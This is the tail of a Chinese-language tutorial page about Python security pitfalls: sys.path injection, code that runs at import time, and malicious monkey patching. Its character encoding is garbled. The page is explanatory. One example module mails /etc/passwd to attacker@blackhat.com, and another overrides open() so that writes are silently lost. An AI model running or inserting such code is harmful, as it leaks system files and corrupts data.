77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>åˆ°æœç´¢è·¯å¾„ä¸­ã€‚åœ¨UNIXå¹³å°ï¼Œæ— è®ºä½•æ—¶ä»æ ‡å‡†è¾“å…¥æˆ–è€…å‘½ä»¤è¡Œ(&quot;-&quot;æˆ–è€…&quot;-c&quot;æˆ–è€…&quot;-m&quot;å‚æ•°)è¯»å…¥ç¨‹åºä»£ç ï¼Œå½“å‰å·¥ä½œç›®å½•éƒ½ä¼šè¢«è‡ªåŠ¨æ’å…¥åˆ°<code>sys.path</code>ä¸­ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>$ echo <span class="token string">&quot;import sys, pprint; pprint.pprint(sys.path)&quot;</span> <span class="token operator">|</span> python <span class="token operator">-</span>
       <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
       $ python <span class="token operator">-</span>c <span class="token string">'import sys, pprint; pprint.pprint(sys.path)'</span>
       <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
       $
       $ cd <span class="token operator">/</span>tmp
       $ python <span class="token operator">-</span>m myapp
       <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token string">'/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg'</span><span class="token punctuation">,</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>è¦å¤„ç†ä»å½“å‰å·¥ä½œè·¯å¾„æ³¨å…¥æ¨¡å—çš„é£é™©ï¼Œæ¨èåœ¨Windowsè¿è¡Œpythonæˆ–è€…é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ä»£ç ä¹‹å‰ï¼Œæ˜¾å¼åœ°ä¿®æ”¹ç›®å½•åˆ°ä¸€ä¸ªå®‰å…¨çš„ç›®å½•ã€‚</p> <p>å¦ä¸€ä¸ªæœç´¢è·¯å¾„å¯èƒ½çš„æ¥æºæ˜¯<code>$PYTHONPATH</code>ç¯å¢ƒå˜é‡çš„å†…å®¹ã€‚æŠµå¾¡<code>sys.path</code>ä¸è¢«è¿›ç¨‹ç¯å¢ƒæ±¡æŸ“çš„ç®€å•åŠæ³•æ˜¯ä¼ é€’<code>-E</code>é€‰é¡¹ç»™pythonè§£é‡Šå™¨ï¼Œè¿™ä¼šè®©å®ƒå¿½ç•¥<code>$PYTHONPATH</code>å˜é‡ã€‚</p> <h2 id="å¯¼å…¥æ—¶çš„ä»£ç æ‰§è¡Œ"><a href="#å¯¼å…¥æ—¶çš„ä»£ç æ‰§è¡Œ" aria-hidden="true" class="header-anchor">#</a> å¯¼å…¥æ—¶çš„ä»£ç æ‰§è¡Œ</h2> <p><code>import</code>è¯­å¥å®é™…ä¸Šä¼šå¯¼å…¥è¢«å¯¼å…¥æ¨¡å—ä¸­çš„ä»£ç çš„æ‰§è¡Œï¼Œè¿™ä¸€äº‹å®å¹¶ä¸æ˜æ˜¾ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”šè‡³å¯¼å…¥ä¸å¯ä¿¡æ¨¡å—æˆ–åŒ…æ˜¯æœ‰é£é™©çš„ã€‚å¯¼å…¥åƒè¿™æ ·çš„ç®€å•æ¨¡å—å¯èƒ½ä¼šå¯¼è‡´ä¸æ„‰å¿«çš„ç»“æœï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>$ cat malicious<span class="token punctuation">.</span>py
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /etc/passwd | mail attacker@blackhat.com'</span><span class="token punctuation">)</span>

<span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'malicious'</span><span class="token punctuation">]</span>  <span class="token comment"># å‡è£…å®ƒæ²¡æœ‰è¢«å¯¼å…¥</span>
$ python
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> malicoius
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>malicious<span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
       NameError<span class="token punctuation">:</span> name <span class="token string">'malicious'</span> <span class="token keyword">is</span> <span class="token operator">not</span> defined
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>ä¸<code>sys.path</code>å…¥å£æ³¨å…¥æ”»å‡»ç›¸ç»“åˆï¼Œå®ƒå¯èƒ½ä¸ºè¿›ä¸€æ­¥çš„ç³»ç»Ÿæ¼æ´åˆ©ç”¨é“ºå¹³é“è·¯ã€‚</p> <h2 id="çŒ´å­è¡¥ä¸-monkey-patching"><a href="#çŒ´å­è¡¥ä¸-monkey-patching" aria-hidden="true" class="header-anchor">#</a> çŒ´å­è¡¥ä¸(monkey patching)</h2> <p>è¿è¡Œæ—¶ä¿®æ”¹pythonå¯¹è±¡å±æ€§çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºçŒ´å­è¡¥ä¸(monkey patching)ã€‚ä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œpythonå®Œå…¨æ”¯æŒè¿è¡Œæ—¶ç¨‹åºè‡ªçœå’Œä»£ç çªå˜ã€‚ä¸€æ—¦ä»¥æŸç§æ–¹å¼å¯¼å…¥äº†ä¸€ä¸ªæ¶æ„æ¨¡å—ï¼Œé‚£ä¹ˆä»»ä½•ç°æœ‰çš„å¯å˜å¯¹è±¡å¯è¢«ä¸çŸ¥ä¸è§‰åœ°åœ¨æ²¡æœ‰ç¨‹åºå‘˜åŒæ„çš„æƒ…å†µä¸‹è¢«æ‰“çŒ´å­è¡¥ä¸ã€‚è€ƒè™‘ä»¥ä¸‹æƒ…å†µï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>$ cat nowrite<span class="token punctuation">.</span>py
<span class="token keyword">import</span> builtins

<span class="token keyword">def</span> <span class="token function">malicious_open</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token operator">and</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'w'</span><span class="token punctuation">:</span>
        args <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'/dev/null'</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> original_open<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>

original_open<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builtins<span class="token punctuation">.</span><span class="token builtin">open</span> <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">,</span> malicious_open
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>å¦‚æœpythonè§£é‡Šå™¨æ‰§è¡Œäº†ä¸Šé¢çš„ä»£ç ï¼Œé‚£ä¹ˆä»»ä½•å†™åˆ°æ–‡ä»¶çš„ä¸œè¥¿éƒ½ä¸ä¼šå­˜å‚¨åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> nowrite
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'data to store'</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span>
raceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">&quot;&lt;stdin&gt;&quot;</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">&gt;</span>
  File <span class="token string">&quot;/Users/username/nowrite.py&quot;</span><span class="token punctuation">,</span> line <span class="token number">6</span><span class="token punctuation">,</span> <span class="token keyword">in</span> malicious_open
    <span class="token keyword">return</span> original_open<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
FileNotFoundError<span class="token punctuation">:</span> <span class="token punctuation">[</span>Errno <span class="token number">2</span><span class="token punctuation">]</span> No such <span class="token builtin">file</span> <span class="token operator">or</span> directory<span class="token punctuation">:</span> <span class="token string">'data.txt'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨pythonåƒåœ¾å›æ”¶å™¨(<code>gc.get_objects()</code>)æ¥æŒæ¡ç°æœ‰çš„æ‰€æœ‰å¯¹è±¡ï¼Œå¹¶é»‘è¿›å®ƒä»¬ä¸­ä»»æ„ä¸€ä¸ªã€‚</p> <p>pythonå¯¹è±¡çš„ç±»å‹æ˜¯ç”±<code>__class__</code>å±æ€§å†³å®šçš„ã€‚é‚ªæ¶çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¾é æ”¹å˜æ´»åŠ¨å¯¹è±¡çš„ç±»å‹æ¥ä»¤äººç»æœ›çš„æŠŠäº‹æƒ…æç ¸ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">class</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">class</span> <span class="token class-name">Y</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x_obj <span class="token operator">=</span> X<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x_obj
<span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>X <span class="token builtin">object</span> at <span class="token number">0x7f62dbe5e010</span><span class="token operator">&gt;</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x_obj<span class="token punctuation">,</span> X<span class="token punctuation">)</span>
<span class="token boolean">True</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x_obj<span class="token punctuation">.</span>__class__ <span class="token operator">=</span> Y
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x_obj
<span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>Y <span class="token builtin">object</span> at <span class="token number">0x7f62dbe5d350</span><span class="token operator">&gt;</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x_obj<span class="token punctuation">,</span> X<span class="token punctuation">)</span>
<span class="token boolean">False</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x_obj<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>
<span class="token boolean">True</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>å¯¹æŠ—æ¶æ„çŒ´å­è¡¥ä¸çš„å”¯ä¸€å¤„ç†æªæ–½æ˜¯ä¿è¯å¯¼å…¥çš„pythonæ¨¡å—çš„çœŸå®æ€§å’Œå®Œæ•´æ€§</p> <h2 id="ç¬”è®°æ•´ç†æ¥æº"><a href="#ç¬”è®°æ•´ç†æ¥æº" aria-hidden="true" class="header-anchor">#</a> ç¬”è®°æ•´ç†æ¥æº</h2> <ol><li><a href="https://juejin.im/entry/58fc232ca22b9d00659dab89" target="_blank" rel="noopener noreferrer">ä¸å¯ä¸çŸ¥çš„ä¸€ç‚¹ Python é™·é˜±<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ol></div> <div class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2018-8-17 19:53:19</span></div></div> <!----> </div> <!----></div></div>
    <script src="/assets/js/31.6649ea1a.js" defer></script><script src="/assets/js/app.59328fb8.js" defer></script>
  </body>
</html>
